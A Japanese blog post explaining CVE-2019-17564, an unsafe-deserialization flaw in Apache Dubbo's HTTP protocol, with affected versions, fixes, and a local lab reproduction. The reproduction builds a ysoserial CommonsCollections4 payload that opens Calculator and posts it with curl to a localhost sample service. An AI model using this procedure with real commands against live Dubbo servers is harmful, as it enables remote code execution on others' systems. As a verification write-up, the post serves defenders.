<div style="text-align: center;">[f:id:motikan2010:20200214224225p:plain]</div>

<div class="contents-box">
  <p>[:contents]</p>
</div>

## はじめに

　2020年2月10日にApache Dubbo の脆弱性が公表されました。  
CVE-2019-17564が登録されたのは2019年10月14日のようです。  

　<b>本脆弱性の内容を一言で言うと、「<span class="m-y">安全でないデシリアライゼーションのJava版</span>」です。</b>
 
　こちらのメールにて Dubboプロジェクトチーム に対して本脆弱性が伝えられています。  
https://www.mail-archive.com/dev@dubbo.apache.org/msg06225.html

　CVE STALKER のデイリーランキングでは7位になっています。  
[f:id:motikan2010:20200214001856p:plain:w600]

<!-- more -->

### Apache Dubbo とは

[f:id:motikan2010:20200214000244p:plain:w600]  

> Apache DubboはJavaをベースにした、オープンソースのリモートプロシージャコールフレームワークである。

　元々はアリババが開発していたものが2011年にOSSになったらしいです。  

[https://github.com/apache/dubbo:embed:cite]

　「Apache Dubbo」で検索してみましたが日本語の記事は以下のものしか見当たりませんでした。  
<span class="m-y">日本国内ではあまり普及していないソフトウェア</span>ではないかと考えられます。中国語の記事が多いイメージでした(ビリビリ動画 など)。  
[https://www.infoq.com/jp/news/2019/08/apache-dubbo/:embed:cite]


#### 脆弱性について

　その 「Apache Dubbo」からデシリアライズの脆弱性(安全でないデシリアライゼーション)が発見されました。  
条件さえ揃えば、<span class="m-y">この脆弱性を利用することでRCEが可能になる脆弱性</span>です。

　Twitterのタイムラインを眺めていても、みんな電卓を起動しているようでした。  

▼ Windows の電卓  
<blockquote class="twitter-tweet"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/CVE?src=hash&amp;ref_src=twsrc%5Etfw">#CVE</a>-2019-17564 Apache Dubbo deserialization RCE <a href="https://t.co/3JiuKTo7Sl">pic.twitter.com/3JiuKTo7Sl</a></p>&mdash; pyn3rd (@pyn3rd) <a href="https://twitter.com/pyn3rd/status/1227604675467202561?ref_src=twsrc%5Etfw">February 12, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

▼ Mac の電卓  
<blockquote class="twitter-tweet"><p lang="ja" dir="ltr"><a href="https://twitter.com/hashtag/CVE?src=hash&amp;ref_src=twsrc%5Etfw">#CVE</a>-2019-17564 Apache Dubbo unserialize RCE 反序列化漏洞 <a href="https://t.co/7ukCFDV5iQ">pic.twitter.com/7ukCFDV5iQ</a></p>&mdash; Jas502n (@jas502n) <a href="https://twitter.com/jas502n/status/1227820484558897158?ref_src=twsrc%5Etfw">February 13, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

### 影響を受けるバージョン

- Dubbo 2.7.0 ~ 2.7.4
- Dubbo 2.6.0 ~ 2.6.7
- Dubbo 2.5.x系 (サポートされていない)

 私が確認した部分だと`2.7.4.1`では再現しませんでした。  

### 解決策

- HTTPプロトコルを無効化
- バージョンを`2.7.5`以上にアップデート(2.7.5 は2019年12月29日にリリース済み)

## 検証環境の準備

　検証は Apache Dubbo のサンプルコードを利用することにします。これが一番簡単な構築方法だと思います。  

以下のリポジトリがそのサンプルコードです。  

[https://github.com/apache/dubbo-samples:embed:cite]

そのサンプルコードの中でも今回はHTTPプロトコルを用いるため、<span><a href="https://github.com/apache/dubbo-samples/tree/master/java/dubbo-samples-http" target="_blank">dubbo-samples-http</a></span> を利用します。  

### Apache ZooKeeper を起動

　Dubbo を起動させるために必要です。コンテナイメージが用意されていますのでそちらを利用します。  
```
$ cd ~/IdeaProjects/dubbo-samples
$ cd java/dubbo-samples-zookeeper/src/main/resources/docker
$ docker-compose up
```

[zookeeper - Docker Hub](https://hub.docker.com/_/zookeeper)

### アプリケーションの修正と起動

　`pom.xml`で Dubbo のバージョンに `2.7.3` を指定します。  
[f:id:motikan2010:20200213232817p:plain]  

　引き続き、Apache Commons Collections バージョン`4.0`を依存に追加します。4.0以外では本記事のやり方ではうまくいきません。  
このように特定のライブラリがソフトウェアに含まれていることが、RCEを成功させるために必要な条件の1つです。  
[f:id:motikan2010:20200213232821p:plain]  

　最後に`HttpProvider`を起動します。無事起動したら準備は完了となります。  

## 脆弱性の検証

　次はペイロードの作成と実際に脆弱性を確認するところまでやってみます。  

### ysoserial を使ってペイロードを生成

　次に ysoserial を使ってペイロードを作成していきます。  

[https://github.com/frohoff/ysoserial:embed:cite]

　ysoserial がどのようなツールなのかを簡単に説明すると、<span class="m-y">デシリアライズ時に任意のJavaコードを実行するバイナリを生成するツール</span>です。    

　Javaではオブジェクトをシリアライズするとバイナリになるようになっていますので、このツールの出力結果もバイナリとなっています。  
ですので、出力結果は一旦ファイルに保存する利用方法になるかと思います。本記事でもそのように利用しています。  

　余談として、他言語で同様の役割をするツールとして、PHPの <span><a href="https://github.com/ambionics/phpggc" target="_blank"> PHPGGC </a></span> があります。  
PHPのシリアライズ後の文字列はJavaより分かりやすいため、デシリアライズの脆弱性(安全でないデシリアライゼーション)の学習にはうってつけです。  

<div class="md-code">
```
// ysoserial の取得とビルド
$ git clone https://github.com/frohoff/ysoserial.git
$ cd ysoserial
$ mvn clean package -DskipTests

// Jarの確認
$ cd target/
$ ls -l ysoserial-0.0.6-SNAPSHOT-all.jar

// ペイロードの生成
// 本記事では Apache Commons Collections 4.0 を使っているので 第1引数 CommonsCollections4 を指定します。
// 第2引数には実行するコマンドを記述します。ここでは電卓が起動するように指定しています。
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 'open -a Calculator' > poc.ser
```
</div>

### ペイロードの中身を確認

　`poc.ser`ファイルの上部を確認してみるとマジックナンバーが「`ac ed`」となっています。  
これはJavaのシリアライズ後のバイナリ列ということを表しています。(参考: <span>[シリアライズ : kei@sodan](http://funini.com/kei/java/serialize.shtml)</span>)
[f:id:motikan2010:20200213232823p:plain]  

### ペイロードの送信

　このバイナリ列をサンプルアプリケーション対して送信してみます。HTTPクライアントは何でもよいのでcurlコマンドを用いています。 
<div class="md-code">
```
$ curl "http://127.0.0.1:8080/org.apache.dubbo.samples.http.api.DemoService" --data-binary @poc.ser
```
</div> 

　電卓が起動し、RCEが成功したことを確認することができました。  
[f:id:motikan2010:20200213232826p:plain]  

### 修正版 2.7.5 で試してみる

　エラーになりました。  
エラーの内容は JSON-RPCのフォーマットでないことが指摘されています。バージョンアップに伴いリクエストの形式に変更があったようです。

[f:id:motikan2010:20200214224726p:plain]

## 参考

- <span>[[漏洞分析]CVE-2019-17564/Apache Dubbo存在反序列化漏洞 - Qiita](https://qiita.com/shimizukawasaki/items/39c9695d439768cfaeb5)</span>
- <span>[r00t4dm/CVE-2019-17564](https://github.com/r00t4dm/CVE-2019-17564)</span>


## 更新履歴

- 2020年 2月14日 新規作成